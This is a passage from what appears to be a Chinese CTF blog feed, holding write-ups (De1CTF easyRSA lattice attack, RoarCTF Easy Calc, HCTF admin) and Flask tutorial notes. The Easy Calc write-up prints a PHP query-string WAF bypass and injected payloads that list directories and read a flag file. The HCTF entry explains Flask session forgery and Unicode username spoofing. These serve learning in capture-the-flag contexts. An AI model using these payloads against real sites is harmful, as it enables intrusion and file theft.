class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> LFSR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-easyRSA</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-easyRSA/</url>
      
        <content type="html"><![CDATA[<p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(lcm,limit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">        d = gmpy2.next_prime(r)</span><br><span class="line">        e = gmpy2.invert(d,lcm)</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">lcm = gmpy2.lcm(p<span class="number">-1</span>,q<span class="number">-1</span>)</span><br><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e1 = genE(lcm,limit)</span><br><span class="line">e2 = genE(lcm,limit)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,phi)</span><br><span class="line">d2 = gmpy2.invert(e2,phi)</span><br><span class="line"></span><br><span class="line">e = [e1,e2]</span><br><span class="line">plain = bytes_to_long(flag)</span><br><span class="line">cipher = pow(plain,e[random.getrandbits(<span class="number">1</span>)],n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'N:'</span> + str(n))</span><br><span class="line">print(<span class="string">'e1:'</span> + str(e1))</span><br><span class="line">print(<span class="string">'e2:'</span> + str(e2))</span><br><span class="line">print(<span class="string">'cipher:'</span> + str(cipher))</span><br></pre></td></tr></table></figure><p>用n计算了两对e，d，其中d都比较小</p><p>这里需要参考这篇论文<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf</a> </p><p>论文的结论就是给出多对e,d，其中$d&lt;N^α$，就可以分解N</p><p>这里当给出2对e，d时需要满足$d&lt;N^{5/14}$，观察题目就可以发现满足该不等式。</p><p>因此我们构造矩阵</p><p>$B = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}$</p><p>$D = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}$</p><p>$L=B*D$</p><p>同时需要求解的向量$v = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))$</p><p>之后对$L$求$LLL$，记为$L_2$</p><p>于是$v = L_2[0]*L^{-1}$</p><p>之后便可得到$\Phi(N)=e_1*v[1]/v[0]​$，进而求得明文</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF[2019]-Easy Calc</title>
      <link href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/"/>
      <url>/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/</url>
      
        <content type="html"><![CDATA[<p>知识点：<strong>PHP的字符串解析特性</strong></p><p>参考文章：<a href="https://www.freebuf.com/column/207936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207936.html</a> </p><p>PHP会将URL或body中的查询字符串关联到<code>$_GET</code>或<code>$_POST</code>。例如：<code>/?foo=bar</code>代表<code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。如果一个IDS/IPS或WAF中有一条规则是当<code>news_id</code>参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;news.php?%20news[id%00&#x3D;42&quot;+AND+1&#x3D;0--</span><br></pre></td></tr></table></figure><p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。 </p><p>有了这个知识，我们就可以绕过waf了。</p><p>同时，我们需要了解几个php的函数</p><ul><li>scandir($dir) , 列出dir下的所有文件和目录，默认升序，如要降序，则用scandir($dir, 1)</li><li>file_get_contents($file)，获取file的内容</li><li>var_dump($var)，输出变量的相关信息 </li></ul><p>ok，然后就是实操</p><p>第一步，获取目录下的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>找到文件flagg</p><p>第二步，获取文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python2基于socket.socket类实现类似pwntools的交互方法</title>
      <link href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。</p><p>由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntools中的交互方法。</p><p>具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">12233</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysocket</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, myhost, myport)</span>:</span></span><br><span class="line">self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.client.connect((myhost, myport))</span><br><span class="line">self.fd = self.client.makefile(<span class="string">'rw'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(self, delim = <span class="string">"\n"</span>)</span>:</span></span><br><span class="line">buf = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> buf.endswith(delim):</span><br><span class="line">buf += self.fd.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> buf.strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendline</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendlineafter</span><span class="params">(self, data, delim = <span class="string">"\n"</span>, debug = False)</span>:</span></span><br><span class="line">buf = self.recvuntil(delim)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"><span class="keyword">print</span> buf.strip()</span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">self.client.close()</span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>后续将根据实际情况继续扩展</p>]]></content>
      
      
      
        <tags>
            
            <tag> socket </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF-admin</title>
      <link href="/2020/05/05/HCTF-admin/"/>
      <url>/2020/05/05/HCTF-admin/</url>
      
        <content type="html"><![CDATA[<p>参考文献</p><ol><li><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a> </li><li><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a> </li><li><a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a> </li></ol><p>从题目中我们可以找到github源码<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p><p>这里可能需要学习一下flask框架<a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">w3cschool</a></p><p>三种解法</p><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br> 具体参考:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.leavesongs.com%2FPENETRATION%2Fclient-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>SECRET_KEY可以在config.py中获取 —— ckj123</p><p>flask中的session的加密和解密可以在<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a> 这里获取到</p><p>对于原先的session先进行解密，修改name后再次加密，然后修改本地session即可。</p><h3 id="Unicode-欺骗"><a href="#Unicode-欺骗" class="headerlink" title="Unicode 欺骗"></a>Unicode 欺骗</h3><p>观察到函数strlower()在register以及change，login中出现了，而且是针对name的处理。</p><p>strlower实际调用的是nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。 可以参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a> </p><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>之后再说</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> flask </tag>
            
            <tag> unicode欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架学习1</title>
      <link href="/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/"/>
      <url>/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p>默认情况下，Flask路由响应<strong>GET</strong>请求。但是，可以通过为<strong>route()</strong>装饰器提供方法参数来更改此首选项 </p><p>如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br></pre></td></tr></table></figure><h3 id="Flask-模板"><a href="#Flask-模板" class="headerlink" title="Flask 模板"></a>Flask 模板</h3><p>可以以HTML的形式返回绑定到某个URL的函数的输出</p><p>相关函数: <strong>render_template()</strong></p><p>Flask将尝试在templates文件夹中找到HTML文件，而templates文件夹与脚本处于同级目录。 </p><p>术语<strong>‘web templating system（web模板系统）’</strong>指的是设计一个HTML脚本，其中可以动态插入变量数据。web模板系统包括模板引擎，某种数据源和模板处理器。 </p><p>例如，以下为hello.html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而我们的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(user)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, name = user)</span><br></pre></td></tr></table></figure><p>那么当我们输入URL- <a href="http://localhost:5000/hello/aaa" target="_blank" rel="noopener">http://localhost:5000/hello/aaa</a> 后，浏览器将显示”Hello aaa”</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- &#123;% ... %&#125;用于语句</span><br><span class="line">- &#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出</span><br><span class="line">- &#123;# ... #&#125;用于未包含在模板输出中的注释</span><br><span class="line">- \# ... ##用于行语句</span><br></pre></td></tr></table></figure><p>举例：</p><p>html模板脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;% if marks&gt;50 %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(score)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, marks = score)</span><br></pre></td></tr></table></figure><h3 id="Flask-静态文件"><a href="#Flask-静态文件" class="headerlink" title="Flask 静态文件"></a>Flask 静态文件</h3><p>Web应用程序通常需要静态文件，例如<strong>javascript</strong>文件或支持网页显示的<strong>CSS</strong>文件。通常，配置Web服务器并为您提供这些服务，但在开发过程中，这些文件是从您的包或模块旁边的<em>static</em>文件夹中提供，它将在应用程序的<strong>/static</strong>中提供（static文件夹与python代码位于同一目录下）。 </p><p>在下面的示例中，在<strong>index.html</strong>中的HTML按钮的<strong>OnClick</strong>事件上调用<strong>hello.js</strong>中定义的<strong>javascript</strong>函数，该函数在Flask应用程序的<strong>“/”</strong>URL上呈现。 </p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hello.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   alert(<span class="string">"Hello World"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flask-将表单数据发送到模板"><a href="#Flask-将表单数据发送到模板" class="headerlink" title="Flask 将表单数据发送到模板"></a>Flask 将表单数据发送到模板</h4><p>在以下示例中，<strong>‘/‘ URL</strong>会呈现具有表单的网页（student.html）。填入的数据会发布到触发 <strong>result()</strong>函数的<strong>‘/result’ URL</strong>。</p><p><strong>results()</strong>函数收集字典对象中的<strong>request.form</strong>中存在的表单数据，并将其发送给<strong>result.html</strong>。</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line">app = Flask(name)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'student.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      result = request.form</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>,result = result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">'main'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>student.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/result"</span> <span class="attr">method</span> = <span class="string">"POST"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Physics <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Physics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Chemistry <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"chemistry"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Maths <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Mathematics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>result.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span> = <span class="string">1</span>&gt;</span></span><br><span class="line">     &#123;% for key, value in result.items() %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="symbol">&amp;lt;</span>tr<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>th<span class="symbol">&amp;gt;</span> &#123;&#123; key &#125;&#125; <span class="symbol">&amp;lt;</span>/th<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>td<span class="symbol">&amp;gt;</span> &#123;&#123; value &#125;&#125; <span class="symbol">&amp;lt;</span>/td<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>/tr<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"> &#123;% endfor %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Flask-Cookies"><a href="#Flask-Cookies" class="headerlink" title="Flask Cookies"></a>Flask Cookies</h3><p>设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(key,value[,max_age&#x3D;None,exprise&#x3D;None)]</span><br></pre></td></tr></table></figure><p>获取cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.cookies.get(key)</span><br></pre></td></tr></table></figure><p> 删除cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.delete_cookie(key)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 